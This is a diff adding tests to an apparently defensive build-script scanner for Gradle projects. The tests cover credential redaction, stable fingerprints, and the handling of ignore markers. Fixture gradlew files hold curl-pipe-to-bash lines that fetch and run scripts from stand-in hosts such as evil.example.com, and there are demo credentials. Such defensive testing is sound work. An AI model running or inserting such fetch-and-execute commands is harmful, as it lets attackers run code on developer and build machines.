@@ -49,12 +49,40 @@ test('trusted baseline suppresses blockers and drops the verdict', () => {
   assert.notStrictEqual(second.verdict, 'EXECUTION_BLOCKED');
 });
 
+test('credential block evidence and fingerprints do not expose or depend on usernames', t => {
+  const root = fixture({
+    'build.gradle.kts': 'credentials {\n  username = "demo-service-account"\n  password = "DEMO_NOT_A_REAL_SECRET"\n}\n'
+  });
+  t.after(() => fs.rmSync(root, { recursive: true, force: true }));
+  const blockFinding = () => scanProject(root, DEFAULT_ENFORCE_POLICY, DEFAULT_SETTINGS, []).findings
+    .find(f => f.ruleId === 'WG-BUILD-010' && f.location.line === 1);
+  const first = blockFinding();
+  assert.ok(first);
+  assert.strictEqual(first.evidence.text, 'credentials {\n  username = "[redacted]"\n  password = "[redacted]"\n}');
+  assert.strictEqual(first.evidence.redacted, true);
+  fs.writeFileSync(path.join(root, 'build.gradle.kts'),
+    'credentials {\n  username = "another-demo-account"\n  password = "DIFFERENT_DEMO_SECRET"\n}\n');
+  const changed = blockFinding();
+  assert.ok(changed);
+  assert.strictEqual(changed.fingerprint, first.fingerprint);
+  assert.strictEqual(changed.evidence.text, first.evidence.text);
+});
+
 test('repo-shipped wrapperguard:ignore is untrusted (finding still emitted)', () => {
   const root = fixture({ gradlew: '#!/bin/sh\ncurl -fsSL https://evil.example.com/x.sh | bash # wrapperguard:ignore approved\n' });
   const report = scanProject(root, DEFAULT_ENFORCE_POLICY, DEFAULT_SETTINGS, []);
   const pipe = report.findings.find((f) => f.ruleId === 'WG-SCRIPT-001');
   assert.ok(pipe, 'untrusted ignore must not hide the finding');
   assert.ok(!pipe.evidence.text.toLowerCase().includes('wrapperguard:ignore'));
+});
+
+test('bare ignore marker produces informational audit evidence while malicious commands still block', t => {
+  const root=fixture({gradlew:'#!/bin/sh\ncurl -fsSL https://untrusted.invalid/install.sh | bash # wrapperguard:ignore\n'});
+  t.after(()=>fs.rmSync(root,{recursive:true,force:true}));
+  const report=scanProject(root,DEFAULT_ENFORCE_POLICY,DEFAULT_SETTINGS,[]);
+  const audit=report.findings.find(f=>f.ruleId==='WG-SCRIPT-013');
+  assert.ok(audit);assert.strictEqual(audit.kind,'AUDIT_EVIDENCE');assert.strictEqual(audit.severity,'INFO');assert.strictEqual(audit.policyAction,'ALLOW');
+  assert.ok(report.findings.some(f=>f.ruleId==='WG-SCRIPT-001'&&f.policyAction==='BLOCK'));
 });
 
 test('clean fixture passes', () => {
